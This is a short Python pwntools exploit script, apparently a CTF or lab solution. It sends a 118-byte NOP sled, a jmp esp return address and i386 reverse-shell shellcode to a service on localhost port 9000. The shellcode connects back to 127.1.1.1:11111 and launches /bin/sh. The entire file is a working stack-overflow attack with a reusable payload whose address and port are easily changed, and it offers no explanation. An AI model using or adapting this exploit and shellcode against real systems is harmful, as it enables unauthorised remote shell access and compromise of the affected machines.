from pwn import *
from socket import inet_aton
from struct import pack
context(arch='i386', os='linux', log_level='info')
H,P='localhost',9000
reverse_shell_IP='127.1.1.1'
reverse_shell_PORT=11111
little_endian_rsp=pack("!H", reverse_shell_PORT)
little_endian_rsip=inet_aton(reverse_shell_IP)
jmpesp=0x080488b0
r = remote(H,P)
junk = r.recvuntil(' ')
print junk
sh = '\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x68'+little_endian_rsip+'\x66\x68'+little_endian_rsp+'\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
exploit = "echo "
exploit += "\x90"*118 # NOP-Sled
exploit += p32(jmpesp)
exploit += sh
r.sendline(exploit)
